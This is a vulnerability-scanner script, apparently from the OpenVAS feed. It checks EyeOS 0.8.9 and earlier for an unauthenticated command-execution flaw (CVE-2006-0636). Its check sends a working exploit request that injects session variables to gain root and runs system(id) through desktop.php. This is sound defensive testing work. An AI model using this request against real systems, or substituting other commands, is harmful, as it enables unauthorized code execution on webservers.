# SPDX-FileCopyrightText: 2008 Ferdy Riphagen
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

# Original advisory / discovered by :
# http://www.gulftech.org/?node=research&article_id=00096-02072006

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.80008");
  script_version("2023-12-13T05:05:23+0000");
  script_tag(name:"last_modification", value:"2023-12-13 05:05:23 +0000 (Wed, 13 Dec 2023)");
  script_tag(name:"creation_date", value:"2008-08-22 16:09:14 +0200 (Fri, 22 Aug 2008)");
  script_cve_id("CVE-2006-0636");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("EyeOS <= 0.8.9 Command Execution Vulnerability");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2008 Ferdy Riphagen");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"solution", value:"Upgrade to eyeOS version 0.8.10.");

  script_tag(name:"summary", value:"The installed version of EyeOS does not initialize user sessions properly,
  allowing unauthenticated attackers to execute arbitrary commands with the privileges of the webserver.");

  script_xref(name:"URL", value:"http://www.gulftech.org/?node=research&article_id=00096-02072006");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/16537");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port(default:80);
if (!http_can_host_php(port:port)) exit(0);

foreach dir( make_list_unique( "/eyeOS", "/eyeos", http_cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  res = http_get_cache(item:string(dir, "/desktop.php"), port:port);
  if(!res) continue;

  if (egrep(pattern:">Welcome to eyeOS v\. [0-9.]+", string:res)) {
    url = "eyeOptions.eyeapp&a=eyeOptions.eyeapp&_SESSION[usr]=root&_SESSION[apps][eyeOptions.eyeapp][wrapup]=";
    cmd = "system(id)";

    url = string(dir, "/desktop.php?baccio=", url, cmd, ";");
    req = http_get(item:url, port:port);
    recv = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (!recv)
      continue;

    if (egrep(pattern:"uid=[0-9]+.*gid=[0-9]+", string:recv)) {
      report = http_report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
